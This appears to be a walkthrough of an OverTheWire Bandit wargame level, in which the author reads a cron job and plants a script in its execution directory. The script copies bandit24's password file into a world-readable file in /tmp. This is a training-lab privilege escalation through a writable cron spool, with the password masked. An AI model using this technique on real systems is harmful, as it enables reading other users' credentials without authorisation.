Level Goal

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

Use ssh and password we got earlier to log in to host as user bandit23

<img width="1422" height="600" alt="image" src="https://github.com/user-attachments/assets/047473bd-c4dc-4677-9bbd-aa396a269d26" />

Step 1: List files in the home directory

ls

Step 2: Move to cron configuration directory

cd /etc/cron.d

Step 3: List cron jobs

ls

Step 4: Read the cron job for bandit24

cat cronjob_bandit24

Output shows:

* * * * * bandit24 /usr/bin/cronjob_bandit24.sh
       
Step 5: Read the cron script

cat /usr/bin/cronjob_bandit24.sh

Step 6: Understand the script behavior

The script:

Changes directory to /var/spool/bandit24/foo

Executes all scripts inside it

Deletes them after execution

Step 7: Create a working directory in /tmp

mkdir /tmp/se

cd /tmp/se

Step 8: Create a file to store the password
touch pass
chmod 777 pass

Step 9: Create a malicious script
nano pass.sh

Script content:

#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/se/pass

Step 10: Make the script executable
chmod 777 pass.sh

Step 11: Copy script into cron execution directory
cp pass.sh /var/spool/bandit24/foo

Step 12: Wait for the cron job to execute

Step 13: Read the password file
cat pass

XXXXXXXXXXXXX(password for next level)

Screenshots:

<img width="1340" height="727" alt="image" src="https://github.com/user-attachments/assets/40f6f501-5cb4-4d93-bd31-7b77ab46e3a9" />

<img width="969" height="403" alt="image" src="https://github.com/user-attachments/assets/02001639-a17a-49ff-9022-5bbdf49fad6d" />

<img width="1445" height="719" alt="image" src="https://github.com/user-attachments/assets/267f8519-6908-4dfb-8d7b-5ea67dad96ea" />



